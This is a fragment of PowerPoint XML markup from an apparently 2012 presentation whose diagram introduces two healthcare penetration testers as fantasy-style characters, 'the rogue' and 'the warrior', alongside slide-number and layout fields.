        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:blipFill>
          <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:embed="rId1" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" xmlns="" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect l="-3000" r="-3000"/>
          </a:stretch>
        </a:blipFill>
        <a:ln w="50800" cap="sq">
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:miter lim="800000"/>
        </a:ln>
        <a:effectLst>
          <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
            <a:prstClr val="black">
              <a:alpha val="40000"/>
            </a:prstClr>
          </a:outerShdw>
        </a:effectLst>
      </dgm:spPr>
    </dgm:pt>
    <dgm:pt modelId="{4548E708-58F6-4FEA-B801-953227BAC05D}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="textRect" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="1" custScaleX="133776" custScaleY="340006" custLinFactNeighborX="-68" custLinFactNeighborY="53725">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{8561E6EE-23F9-4FFA-ADD5-D912F8DB80B1}" type="presOf" srcId="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" destId="{3DF99565-C45C-4440-A910-CA0C80068F61}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3"/>
    <dgm:cxn modelId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}" srcId="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" destId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" srcOrd="0" destOrd="0" parTransId="{B5B83F9F-2E42-46E0-917E-41A8418A86EA}" sibTransId="{9A4A50C0-381A-44E0-BC17-7131166765F4}"/>
    <dgm:cxn modelId="{00C78EEC-DB64-4AED-9A1B-C583F7546EFD}" type="presOf" srcId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" destId="{4548E708-58F6-4FEA-B801-953227BAC05D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3"/>
    <dgm:cxn modelId="{55FFDBBC-0C80-4F8E-9E4C-965A53358107}" type="presParOf" srcId="{3DF99565-C45C-4440-A910-CA0C80068F61}" destId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3"/>
    <dgm:cxn modelId="{5CD3308B-1E2D-434F-8635-B7DEFE55FF16}" type="presParOf" srcId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" destId="{DBC406D6-F4F2-4DAC-B0A5-7255F55B48DF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3"/>
    <dgm:cxn modelId="{4648932C-D18E-4705-8AAA-3E4578A5134C}" type="presParOf" srcId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" destId="{4548E708-58F6-4FEA-B801-953227BAC05D}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3"/>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BC406D6-F4F2-4DAC-B0A5-7255F55B48DF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="2290293" cy="1047787"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:blipFill dpi="0" rotWithShape="1">
          <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:embed="rId1" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" xmlns="" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </a:blipFill>
        <a:ln w="50800" cap="sq" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:prstDash val="solid"/>
          <a:miter lim="800000"/>
        </a:ln>
        <a:effectLst>
          <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="c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sp>
    <dsp:sp modelId="{4548E708-58F6-4FEA-B801-953227BAC05D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3" y="1098240"/>
          <a:ext cx="2301908" cy="2170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72000" rIns="0" bIns="0" numCol="1" spcCol="1270" anchor="t" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Stefan Morris</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="1200"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" kern="1200" cap="all" baseline="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>The rogue</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="1400" kern="1200" noProof="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Penetration</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> tester</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" noProof="0" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>App</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>security</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>assesser</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>4 </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>yr</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>. </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>healthcare</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> IS </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>experience</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Dangerous</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>with</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> a </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>dirk</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" kern="1200" dirty="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3" y="1098240"/>
        <a:ext cx="2301908" cy="2170552"/>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BC406D6-F4F2-4DAC-B0A5-7255F55B48DF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="2290293" cy="1047787"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:blipFill>
          <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:embed="rId1" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" xmlns="" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect l="-3000" r="-3000"/>
          </a:stretch>
        </a:blipFill>
        <a:ln w="50800" cap="sq" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:prstDash val="solid"/>
          <a:miter lim="800000"/>
        </a:ln>
        <a:effectLst>
          <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="c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sp>
    <dsp:sp modelId="{4548E708-58F6-4FEA-B801-953227BAC05D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3" y="1098240"/>
          <a:ext cx="2301908" cy="2170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72000" rIns="0" bIns="0" numCol="1" spcCol="1270" anchor="t" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Tim </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Elrod</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1800" kern="1200" dirty="0" smtClean="0">
            <a:solidFill>
              <a:srgbClr val="82B400"/>
            </a:solidFill>
            <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="1200"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" kern="1200" cap="all" baseline="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>The </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" kern="1200" cap="all" baseline="0" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>warrior</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" b="1" kern="1200" cap="all" baseline="0" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Penetration</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> tester for FNS</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Over 7 </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>years</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>testing</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>healthcare</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>systems</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr lvl="0" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Able </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>with</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" kern="1200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> an axe</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" kern="1200" dirty="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3" y="1098240"/>
        <a:ext cx="2301908" cy="2170552"/>
      </dsp:txXfrm>
    </dsp:sp>
  </dsp:spTree>
</dsp:drawing>
</file>

<file path=ppt/diagrams/layout1.xml><?xml version="1.0" encoding="utf-8"?>
<dgm:layoutDef xmlns:dgm="http://schemas.openxmlformats.org/drawingml/2006/diagram" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" uniqueId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#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List1#3">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2400B8F-BB58-4D46-BF28-C340FC2CB54B}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/13/2012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CE85C61-B186-47B8-8E2B-1103EC6C9457}"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9861247-3EEC-452B-83EA-9D44F204783C}" type="datetimeFigureOut">
              <a:rPr lang="fr-CA" smtClean="0"/>
              <a:pPr/>
              <a:t>2012-06-13</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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A"/>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FCED6B7-9771-4408-BFA2-BD1F84771A76}" type="slidenum">
              <a:rPr lang="fr-CA" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3859398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FCED6B7-9771-4408-BFA2-BD1F84771A76}" type="slidenum">
              <a:rPr lang="fr-CA" smtClean="0"/>
              <a:pPr/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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1FCED6B7-9771-4408-BFA2-BD1F84771A76}" type="slidenum">
              <a:rPr lang="fr-CA" smtClean="0"/>
              <a:pPr/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="1420102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3</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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4</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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5</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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6</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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7</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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8</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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9</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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10</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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11</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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12</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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13</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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14</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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15</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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16</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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17</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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18</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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19</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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20</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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21</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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22</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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23</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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24</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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25</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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26</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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27</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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28</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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29</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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30</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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31</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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32</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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33</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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34</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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35</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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36</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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37</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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CED6B7-9771-4408-BFA2-BD1F84771A76}" type="slidenum">
              <a:rPr lang="fr-CA" smtClean="0"/>
              <a:pPr/>
              <a:t>38</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-CA"/>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Content">
    <p:spTree>
